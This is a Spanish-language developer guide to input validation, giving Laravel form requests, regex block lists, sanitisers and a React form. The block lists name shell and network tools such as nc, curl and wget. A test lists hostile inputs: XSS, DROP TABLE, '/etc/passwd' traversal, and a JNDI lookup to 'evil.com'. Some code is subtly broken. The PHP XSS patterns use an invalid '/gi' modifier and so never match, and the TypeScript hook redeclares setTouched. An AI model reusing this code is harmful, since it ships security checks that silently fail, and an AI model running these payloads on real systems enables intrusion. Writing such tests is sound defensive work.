# Validaciones de Seguridad

## ¿Qué es?

Las validaciones de seguridad son el conjunto de técnicas y controles que se
implementan para verificar, sanitizar y validar todos los datos de entrada en
una aplicación, garantizando que solo información segura y esperada sea
procesada por el sistema. Estas validaciones constituyen la primera línea de
defensa contra múltiples tipos de ataques cibernéticos.

## ¿Por qué es importante?

- **Prevención de inyecciones**: Protege contra SQL injection, XSS, command
  injection
- **Integridad de datos**: Asegura que los datos cumplan con los formatos y
  restricciones esperadas
- **Prevención de escalación**: Evita que usuarios accedan a recursos no
  autorizados
- **Cumplimiento normativo**: Ayuda a cumplir con estándares de seguridad y
  privacidad
- **Experiencia de usuario**: Proporciona feedback claro sobre errores de
  entrada
- **Auditoría**: Facilita el rastreo y logging de intentos de acceso maliciosos
- **Reducción de superficie de ataque**: Minimiza los vectores de ataque
  disponibles

## ¿Qué debe incluir?

### Tipos de Validación

#### 1. Validación de Entrada (Input Validation)

- Verificación de tipo de datos
- Validación de longitud y rangos
- Validación de formato (regex)
- Whitelist vs Blacklist approaches

#### 2. Sanitización (Data Sanitization)

- Escape de caracteres especiales
- Filtrado de contenido malicioso
- Normalización de datos
- Eliminación de elementos peligrosos

#### 3. Validación de Salida (Output Encoding)

- Escape para HTML
- Escape para JavaScript
- Escape para SQL
- Escape para XML/JSON

#### 4. Validación de Contexto

- Verificación de permisos
- Validación de estado de sesión
- Verificación de origen (CSRF)
- Validación de integridad

## ¿Qué debo hacer?

### 1. Implementar Validaciones de Entrada Backend

#### Form Requests en Laravel

```php
<?php
// app/Infrastructure/Http/Requests/V1/CreateUserRequest.php

namespace App\Infrastructure\Http\Requests\V1;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rules\Password;

class CreateUserRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true; // Autorización manejada por middleware
    }

    public function rules(): array
    {
        return [
            'name' => [
                'required',
                'string',
                'min:2',
                'max:100',
                'regex:/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]+$/' // Solo letras y espacios
            ],
            'email' => [
                'required',
                'email:rfc,dns', // Validación RFC y DNS
                'max:255',
                'unique:users,email'
            ],
            'password' => [
                'required',
                'confirmed',
                Password::min(8)
                    ->mixedCase()
                    ->numbers()
                    ->symbols()
                    ->uncompromised() // Verificar en base de datos de contraseñas comprometidas
            ],
            'phone' => [
                'nullable',
                'regex:/^[\+]?[1-9][\d]{0,15}$/' // Formato internacional
            ],
            'age' => [
                'required',
                'integer',
                'min:18',
                'max:120'
            ],
            'website' => [
                'nullable',
                'url',
                'regex:/^https?:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/'
            ],
            'role' => [
                'required',
                'string',
                'in:user,admin,moderator' // Whitelist de roles permitidos
            ]
        ];
    }

    public function messages(): array
    {
        return [
            'name.regex' => 'El nombre solo puede contener letras y espacios',
            'email.email' => 'El formato del email no es válido',
            'email.unique' => 'Este email ya está registrado',
            'password.uncompromised' => 'Esta contraseña ha sido comprometida en filtraciones de datos',
            'phone.regex' => 'El formato del teléfono no es válido',
            'website.regex' => 'La URL debe comenzar con http:// o https://',
            'role.in' => 'El rol seleccionado no es válido'
        ];
    }

    protected function prepareForValidation(): void
    {
        $this->merge([
            'email' => strtolower(trim($this->email)),
            'name' => trim($this->name),
            'phone' => preg_replace('/[^+\d]/', '', $this->phone ?? '')
        ]);
    }
}
```

#### Validaciones Personalizadas Avanzadas

```php
<?php
// app/Application/Validators/SecurityValidator.php

namespace App\Application\Validators;

use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rule;

class SecurityValidator
{
    public static function boot(): void
    {
        // Validador para detectar contenido malicioso
        Validator::extend('no_malicious_content', function ($attribute, $value, $parameters, $validator) {
            $maliciousPatterns = [
                '/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi',
                '/javascript:/i',
                '/vbscript:/i',
                '/onload=/i',
                '/onerror=/i',
                '/onclick=/i',
                '/onfocus=/i',
                '/onmouseover=/i',
                '/<iframe/i',
                '/<object/i',
                '/<embed/i',
                '/eval\s*\(/i',
                '/expression\s*\(/i'
            ];

            foreach ($maliciousPatterns as $pattern) {
                if (preg_match($pattern, $value)) {
                    return false;
                }
            }

            return true;
        });

        // Validador para SQL injection
        Validator::extend('no_sql_injection', function ($attribute, $value, $parameters, $validator) {
            $sqlPatterns = [
                '/(\b(select|insert|update|delete|drop|create|alter|exec|execute)\b)/i',
                '/(union\s+select)/i',
                '/(\-\-|\#)/i',
                '/(\/\*.*\*\/)/i',
                '/(\;)/i'
            ];

            foreach ($sqlPatterns as $pattern) {
                if (preg_match($pattern, $value)) {
                    return false;
                }
            }

            return true;
        });

        // Validador para path traversal
        Validator::extend('no_path_traversal', function ($attribute, $value, $parameters, $validator) {
            $pathPatterns = [
                '/\.\.\//',
                '/\.\.\\\\/',
                '/%2e%2e%2f/',
                '/%2e%2e\\\\/',
                '/\.\.\%2f/',
                '/\.\.\%5c/'
            ];

            foreach ($pathPatterns as $pattern) {
                if (preg_match($pattern, $value)) {
                    return false;
                }
            }

            return true;
        });

        // Validador para comandos del sistema
        Validator::extend('no_system_commands', function ($attribute, $value, $parameters, $validator) {
            $commandPatterns = [
                '/(\b(ls|cat|grep|ps|kill|rm|mv|cp|chmod|chown|sudo|su|passwd)\b)/i',
                '/(\||&|;|`|\$\(|\$\{)/i',
                '/(nc|netcat|curl|wget|ping)/i'
            ];

            foreach ($commandPatterns as $pattern) {
                if (preg_match($pattern, $value)) {
                    return false;
                }
            }

            return true;
        });

        // Validador para archivos seguros
        Validator::extend('safe_file_extension', function ($attribute, $value, $parameters, $validator) {
            $allowedExtensions = $parameters ?: ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx'];
            $extension = strtolower($value->getClientOriginalExtension());

            return in_array($extension, $allowedExtensions);
        });
    }

    public static function validateFileUpload($file): array
    {
        $errors = [];

        // Verificar MIME type real
        $allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
        $actualMime = mime_content_type($file->getPathname());

        if (!in_array($actualMime, $allowedMimes)) {
            $errors[] = 'Tipo de archivo no permitido';
        }

        // Verificar extensión
        $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
        $extension = strtolower($file->getClientOriginalExtension());

        if (!in_array($extension, $allowedExtensions)) {
            $errors[] = 'Extensión de archivo no permitida';
        }

        // Verificar tamaño
        $maxSize = 5 * 1024 * 1024; // 5MB
        if ($file->getSize() > $maxSize) {
            $errors[] = 'Archivo demasiado grande';
        }

        // Verificar nombre de archivo
        $filename = $file->getClientOriginalName();
        if (preg_match('/[<>:"|?*]/', $filename)) {
            $errors[] = 'Nombre de archivo contiene caracteres no válidos';
        }

        return $errors;
    }
}
```

### 2. Implementar Sanitización de Datos

#### Service de Sanitización

```php
<?php
// app/Application/Services/DataSanitizer.php

namespace App\Application\Services;

class DataSanitizer
{
    public static function sanitizeString(string $input, array $options = []): string
    {
        $allowHtml = $options['allow_html'] ?? false;
        $maxLength = $options['max_length'] ?? null;
        $allowNewlines = $options['allow_newlines'] ?? false;

        // Trim whitespace
        $input = trim($input);

        // Remove null bytes
        $input = str_replace("\0", '', $input);

        // Handle HTML
        if (!$allowHtml) {
            $input = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        } else {
            $input = self::sanitizeHtml($input);
        }

        // Handle newlines
        if (!$allowNewlines) {
            $input = preg_replace('/\r\n|\r|\n/', ' ', $input);
        }

        // Truncate if needed
        if ($maxLength && strlen($input) > $maxLength) {
            $input = substr($input, 0, $maxLength);
        }

        return $input;
    }

    public static function sanitizeHtml(string $html): string
    {
        $allowedTags = '<p><br><strong><em><u><a><ul><ol><li><h1><h2><h3><h4><h5><h6>';
        $allowedAttributes = ['href', 'title', 'alt'];

        // Strip dangerous tags
        $html = strip_tags($html, $allowedTags);

        // Remove dangerous attributes
        $html = preg_replace_callback(
            '/<([^>]+)>/',
            function ($matches) use ($allowedAttributes) {
                $tag = $matches[1];
                $tagName = strtok($tag, ' ');

                // Remove event handlers and dangerous attributes
                $tag = preg_replace('/\s*(on\w+|style|class)\s*=\s*["\'][^"\']*["\']/i', '', $tag);

                // Only keep allowed attributes
                foreach ($allowedAttributes as $attr) {
                    if (preg_match('/\s+' . $attr . '\s*=\s*["\']([^"\']*)["\']/', $tag, $attrMatches)) {
                        $value = $attrMatches[1];

                        // Validate URL attributes
                        if ($attr === 'href' && !self::isValidUrl($value)) {
                            $tag = preg_replace('/\s+' . $attr . '\s*=\s*["\'][^"\']*["\']/', '', $tag);
                        }
                    }
                }

                return '<' . $tag . '>';
            },
            $html
        );

        return $html;
    }

    public static function sanitizeEmail(string $email): string
    {
        $email = trim(strtolower($email));
        $email = filter_var($email, FILTER_SANITIZE_EMAIL);

        return $email;
    }

    public static function sanitizeUrl(string $url): string
    {
        $url = trim($url);
        $url = filter_var($url, FILTER_SANITIZE_URL);

        // Ensure URL has a valid scheme
        if (!preg_match('/^https?:\/\//', $url)) {
            $url = 'https://' . $url;
        }

        return $url;
    }

    public static function sanitizeFilename(string $filename): string
    {
        // Remove path traversal attempts
        $filename = basename($filename);

        // Remove dangerous characters
        $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);

        // Prevent hidden files
        $filename = ltrim($filename, '.');

        // Ensure not empty
        if (empty($filename)) {
            $filename = 'file_' . uniqid();
        }

        return $filename;
    }

    public static function sanitizeInteger($value, int $min = null, int $max = null): ?int
    {
        $value = filter_var($value, FILTER_VALIDATE_INT);

        if ($value === false) {
            return null;
        }

        if ($min !== null && $value < $min) {
            return $min;
        }

        if ($max !== null && $value > $max) {
            return $max;
        }

        return $value;
    }

    public static function sanitizeFloat($value, float $min = null, float $max = null): ?float
    {
        $value = filter_var($value, FILTER_VALIDATE_FLOAT);

        if ($value === false) {
            return null;
        }

        if ($min !== null && $value < $min) {
            return $min;
        }

        if ($max !== null && $value > $max) {
            return $max;
        }

        return $value;
    }

    private static function isValidUrl(string $url): bool
    {
        // Check if URL is valid
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            return false;
        }

        // Check allowed schemes
        $allowedSchemes = ['http', 'https', 'mailto'];
        $scheme = parse_url($url, PHP_URL_SCHEME);

        return in_array($scheme, $allowedSchemes);
    }
}
```

### 3. Validaciones Frontend con TypeScript

#### Utility de Validación Frontend

```typescript
// src/utils/validation.ts

export interface ValidationResult {
  isValid: boolean;
  errors: string[];
}

export class InputValidator {
  // Validación de email
  static validateEmail(email: string): ValidationResult {
    const errors: string[] = [];

    if (!email) {
      errors.push("El email es requerido");
    } else {
      // RFC 5322 compliant regex (simplified)
      const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
      if (!emailRegex.test(email)) {
        errors.push("El formato del email no es válido");
      }

      if (email.length > 254) {
        errors.push("El email es demasiado largo");
      }
    }

    return { isValid: errors.length === 0, errors };
  }

  // Validación de contraseña
  static validatePassword(password: string): ValidationResult {
    const errors: string[] = [];

    if (!password) {
      errors.push("La contraseña es requerida");
      return { isValid: false, errors };
    }

    if (password.length < 8) {
      errors.push("La contraseña debe tener al menos 8 caracteres");
    }

    if (password.length > 128) {
      errors.push("La contraseña es demasiado larga");
    }

    if (!/[A-Z]/.test(password)) {
      errors.push("La contraseña debe contener al menos una letra mayúscula");
    }

    if (!/[a-z]/.test(password)) {
      errors.push("La contraseña debe contener al menos una letra minúscula");
    }

    if (!/\d/.test(password)) {
      errors.push("La contraseña debe contener al menos un número");
    }

    if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
      errors.push("La contraseña debe contener al menos un carácter especial");
    }

    // Check common weak passwords
    const weakPasswords = [
      "password",
      "123456",
      "qwerty",
      "abc123",
      "password123",
      "12345678",
      "welcome",
      "admin",
      "letmein",
      "monkey",
    ];

    if (weakPasswords.includes(password.toLowerCase())) {
      errors.push("Esta contraseña es muy común y fácil de adivinar");
    }

    return { isValid: errors.length === 0, errors };
  }

  // Validación de nombre
  static validateName(name: string): ValidationResult {
    const errors: string[] = [];

    if (!name) {
      errors.push("El nombre es requerido");
    } else {
      if (name.length < 2) {
        errors.push("El nombre debe tener al menos 2 caracteres");
      }

      if (name.length > 100) {
        errors.push("El nombre es demasiado largo");
      }

      // Solo letras, espacios y algunos caracteres especiales
      const nameRegex = /^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s'-]+$/;
      if (!nameRegex.test(name)) {
        errors.push(
          "El nombre solo puede contener letras, espacios, apostrofes y guiones"
        );
      }
    }

    return { isValid: errors.length === 0, errors };
  }

  // Validación de teléfono
  static validatePhone(phone: string): ValidationResult {
    const errors: string[] = [];

    if (phone) {
      // Formato internacional básico
      const phoneRegex = /^[\+]?[1-9][\d\s\-\(\)]{7,15}$/;
      if (!phoneRegex.test(phone)) {
        errors.push("El formato del teléfono no es válido");
      }
    }

    return { isValid: errors.length === 0, errors };
  }

  // Validación de URL
  static validateUrl(url: string): ValidationResult {
    const errors: string[] = [];

    if (url) {
      try {
        const parsedUrl = new URL(url);

        // Solo permitir HTTP y HTTPS
        if (!["http:", "https:"].includes(parsedUrl.protocol)) {
          errors.push("Solo se permiten URLs HTTP y HTTPS");
        }

        // Verificar que no sea localhost en producción
        if (
          process.env.NODE_ENV === "production" &&
          (parsedUrl.hostname === "localhost" ||
            parsedUrl.hostname === "127.0.0.1")
        ) {
          errors.push("No se permiten URLs locales en producción");
        }
      } catch {
        errors.push("El formato de la URL no es válido");
      }
    }

    return { isValid: errors.length === 0, errors };
  }

  // Validación de edad
  static validateAge(age: number | string): ValidationResult {
    const errors: string[] = [];

    const ageNum = typeof age === "string" ? parseInt(age, 10) : age;

    if (isNaN(ageNum)) {
      errors.push("La edad debe ser un número");
    } else {
      if (ageNum < 18) {
        errors.push("Debe ser mayor de edad (18 años)");
      }

      if (ageNum > 120) {
        errors.push("La edad no puede ser mayor a 120 años");
      }
    }

    return { isValid: errors.length === 0, errors };
  }

  // Validación de archivos
  static validateFile(
    file: File,
    options: {
      allowedTypes?: string[];
      maxSize?: number;
      allowedExtensions?: string[];
    } = {}
  ): ValidationResult {
    const errors: string[] = [];

    const {
      allowedTypes = [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/pdf",
      ],
      maxSize = 5 * 1024 * 1024, // 5MB
      allowedExtensions = ["jpg", "jpeg", "png", "gif", "pdf"],
    } = options;

    if (!file) {
      errors.push("Debe seleccionar un archivo");
      return { isValid: false, errors };
    }

    // Verificar tipo MIME
    if (!allowedTypes.includes(file.type)) {
      errors.push(
        `Tipo de archivo no permitido. Tipos válidos: ${allowedTypes.join(
          ", "
        )}`
      );
    }

    // Verificar tamaño
    if (file.size > maxSize) {
      const maxSizeMB = maxSize / (1024 * 1024);
      errors.push(
        `El archivo es demasiado grande. Tamaño máximo: ${maxSizeMB}MB`
      );
    }

    // Verificar extensión
    const extension = file.name.split(".").pop()?.toLowerCase();
    if (extension && !allowedExtensions.includes(extension)) {
      errors.push(
        `Extensión no permitida. Extensiones válidas: ${allowedExtensions.join(
          ", "
        )}`
      );
    }

    // Verificar nombre de archivo
    if (file.name.length > 255) {
      errors.push("El nombre del archivo es demasiado largo");
    }

    // Verificar caracteres peligrosos en el nombre
    const dangerousChars = /[<>:"|?*\\\/]/;
    if (dangerousChars.test(file.name)) {
      errors.push("El nombre del archivo contiene caracteres no válidos");
    }

    return { isValid: errors.length === 0, errors };
  }

  // Sanitización de entrada
  static sanitizeInput(input: string): string {
    if (!input) return "";

    // Remover caracteres nulos
    input = input.replace(/\0/g, "");

    // Trim espacios
    input = input.trim();

    // Escapar HTML
    input = input
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");

    return input;
  }

  // Detección de contenido malicioso
  static detectMaliciousContent(input: string): boolean {
    const maliciousPatterns = [
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      /javascript:/i,
      /vbscript:/i,
      /on\w+\s*=/i,
      /<iframe/i,
      /<object/i,
      /<embed/i,
      /eval\s*\(/i,
      /expression\s*\(/i,
    ];

    return maliciousPatterns.some((pattern) => pattern.test(input));
  }
}

// Hook personalizado para validación en tiempo real
export function useValidation<T extends Record<string, any>>(
  initialValues: T,
  validators: Partial<Record<keyof T, (value: any) => ValidationResult>>
) {
  const [values, setValues] = useState<T>(initialValues);
  const [errors, setErrors] = useState<Partial<Record<keyof T, string[]>>>({});
  const [touched, setTouched] = useState<Partial<Record<keyof T, boolean>>>({});

  const validateField = useCallback(
    (field: keyof T, value: any): ValidationResult => {
      const validator = validators[field];
      if (!validator) return { isValid: true, errors: [] };

      return validator(value);
    },
    [validators]
  );

  const validateAllFields = useCallback((): boolean => {
    const newErrors: Partial<Record<keyof T, string[]>> = {};
    let isValid = true;

    Object.keys(validators).forEach((field) => {
      const result = validateField(field as keyof T, values[field as keyof T]);
      if (!result.isValid) {
        newErrors[field as keyof T] = result.errors;
        isValid = false;
      }
    });

    setErrors(newErrors);
    return isValid;
  }, [values, validateField]);

  const setValue = useCallback(
    (field: keyof T, value: any) => {
      setValues((prev) => ({ ...prev, [field]: value }));

      // Validar el campo inmediatamente si ya fue tocado
      if (touched[field]) {
        const result = validateField(field, value);
        setErrors((prev) => ({
          ...prev,
          [field]: result.isValid ? undefined : result.errors,
        }));
      }
    },
    [validateField, touched]
  );

  const setTouched = useCallback(
    (field: keyof T, isTouched: boolean = true) => {
      setTouched((prev) => ({ ...prev, [field]: isTouched }));

      if (isTouched) {
        const result = validateField(field, values[field]);
        setErrors((prev) => ({
          ...prev,
          [field]: result.isValid ? undefined : result.errors,
        }));
      }
    },
    [validateField, values]
  );

  return {
    values,
    errors,
    touched,
    setValue,
    setTouched,
    validateAllFields,
    isValid: Object.keys(errors).length === 0,
  };
}
```

### 4. Componente de Formulario Seguro

```tsx
// src/components/Forms/SecureForm.tsx
import React from "react";
import { InputValidator, useValidation } from "../../utils/validation";

interface UserFormData {
  name: string;
  email: string;
  password: string;
  confirmPassword: string;
  phone: string;
  website: string;
  age: number;
}

const UserForm: React.FC = () => {
  const {
    values,
    errors,
    touched,
    setValue,
    setTouched,
    validateAllFields,
    isValid,
  } = useValidation<UserFormData>(
    {
      name: "",
      email: "",
      password: "",
      confirmPassword: "",
      phone: "",
      website: "",
      age: 18,
    },
    {
      name: InputValidator.validateName,
      email: InputValidator.validateEmail,
      password: InputValidator.validatePassword,
      confirmPassword: (value: string) => {
        if (value !== values.password) {
          return { isValid: false, errors: ["Las contraseñas no coinciden"] };
        }
        return { isValid: true, errors: [] };
      },
      phone: InputValidator.validatePhone,
      website: InputValidator.validateUrl,
      age: InputValidator.validateAge,
    }
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateAllFields()) {
      return;
    }

    // Sanitizar datos antes de enviar
    const sanitizedData = {
      name: InputValidator.sanitizeInput(values.name),
      email: values.email.toLowerCase().trim(),
      password: values.password,
      phone: values.phone.replace(/[^\d+]/g, ""),
      website: values.website,
      age: values.age,
    };

    try {
      const response = await fetch("/api/users", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-CSRF-TOKEN":
            document
              .querySelector('meta[name="csrf-token"]')
              ?.getAttribute("content") || "",
        },
        body: JSON.stringify(sanitizedData),
      });

      if (!response.ok) {
        throw new Error("Error al crear usuario");
      }

      // Manejar éxito
      console.log("Usuario creado exitosamente");
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="secure-form">
      <div className="form-group">
        <label htmlFor="name">Nombre completo *</label>
        <input
          id="name"
          type="text"
          value={values.name}
          onChange={(e) => setValue("name", e.target.value)}
          onBlur={() => setTouched("name")}
          className={errors.name && touched.name ? "error" : ""}
          maxLength={100}
          autoComplete="name"
        />
        {errors.name && touched.name && (
          <div className="error-messages">
            {errors.name.map((error, index) => (
              <span key={index} className="error-message">
                {error}
              </span>
            ))}
          </div>
        )}
      </div>

      <div className="form-group">
        <label htmlFor="email">Email *</label>
        <input
          id="email"
          type="email"
          value={values.email}
          onChange={(e) => setValue("email", e.target.value)}
          onBlur={() => setTouched("email")}
          className={errors.email && touched.email ? "error" : ""}
          maxLength={255}
          autoComplete="email"
        />
        {errors.email && touched.email && (
          <div className="error-messages">
            {errors.email.map((error, index) => (
              <span key={index} className="error-message">
                {error}
              </span>
            ))}
          </div>
        )}
      </div>

      <div className="form-group">
        <label htmlFor="password">Contraseña *</label>
        <input
          id="password"
          type="password"
          value={values.password}
          onChange={(e) => setValue("password", e.target.value)}
          onBlur={() => setTouched("password")}
          className={errors.password && touched.password ? "error" : ""}
          maxLength={128}
          autoComplete="new-password"
        />
        {errors.password && touched.password && (
          <div className="error-messages">
            {errors.password.map((error, index) => (
              <span key={index} className="error-message">
                {error}
              </span>
            ))}
          </div>
        )}
      </div>

      <button
        type="submit"
        disabled={!isValid}
        className={`submit-button ${!isValid ? "disabled" : ""}`}
      >
        Crear Usuario
      </button>
    </form>
  );
};

export default UserForm;
```

## Tips

### Mejores Prácticas de Validación

1. **Validación en múltiples capas**:

   - Cliente (UX/UI)
   - Servidor (Seguridad)
   - Base de datos (Integridad)

2. **Principio de menor privilegio**:

   - Solo validar lo que necesitas
   - Rechazar por defecto
   - Permitir explícitamente

3. **Whitelist vs Blacklist**:

   - Usar listas permitidas (whitelist)
   - Evitar listas prohibidas (blacklist)
   - Las whitelist son más seguras

4. **Sanitización de salida**:
   - Escapar según el contexto
   - HTML, JavaScript, SQL, XML
   - Usar librerías probadas

### Configuración de Validadores Globales

```php
<?php
// app/Providers/AppServiceProvider.php

public function boot(): void
{
    // Registrar validadores personalizados
    SecurityValidator::boot();

    // Configurar validación de archivos globalmente
    UploadedFile::macro('isSecure', function () {
        return SecurityValidator::validateFileUpload($this);
    });
}
```

### Middleware de Validación Global

```php
<?php
// app/Infrastructure/Http/Middleware/InputSanitization.php

namespace App\Infrastructure\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Application\Services\DataSanitizer;

class InputSanitization
{
    public function handle(Request $request, Closure $next)
    {
        $input = $request->all();
        $sanitized = $this->sanitizeArray($input);
        $request->replace($sanitized);

        return $next($request);
    }

    private function sanitizeArray(array $data): array
    {
        foreach ($data as $key => $value) {
            if (is_array($value)) {
                $data[$key] = $this->sanitizeArray($value);
            } elseif (is_string($value)) {
                $data[$key] = DataSanitizer::sanitizeString($value);
            }
        }

        return $data;
    }
}
```

## Ejemplos

### Validación Completa de API

```php
<?php
// Ejemplo de endpoint con validación completa
class UserController extends Controller
{
    public function store(CreateUserRequest $request)
    {
        // Los datos ya están validados por el Form Request
        $validatedData = $request->validated();

        // Sanitización adicional si es necesaria
        $sanitizedData = [
            'name' => DataSanitizer::sanitizeString($validatedData['name']),
            'email' => DataSanitizer::sanitizeEmail($validatedData['email']),
            'phone' => preg_replace('/[^\d+]/', '', $validatedData['phone'] ?? ''),
        ];

        // Crear usuario
        $user = $this->createUserUseCase->execute(
            UserDTO::fromArray($sanitizedData)
        );

        return new UserResource($user);
    }
}
```

### Testing de Validaciones

```php
<?php
// tests/Feature/ValidationTest.php

class ValidationTest extends TestCase
{
    /** @test */
    public function it_rejects_malicious_input()
    {
        $maliciousInputs = [
            '<script>alert("xss")</script>',
            '\'; DROP TABLE users; --',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}'
        ];

        foreach ($maliciousInputs as $input) {
            $response = $this->postJson('/api/users', [
                'name' => $input,
                'email' => 'test@example.com',
                'password' => 'ValidPass123!'
            ]);

            $response->assertStatus(422);
        }
    }
}
```

## Navegación

[⬅️ APIs RESTful Versionadas](./apis-restful-versionadas.md) |
[🏠 README Principal](../../README.md) |
[Manejo Seguro de Archivos ➡️](./docs/step_04/manejo-archivos-seguro.md)
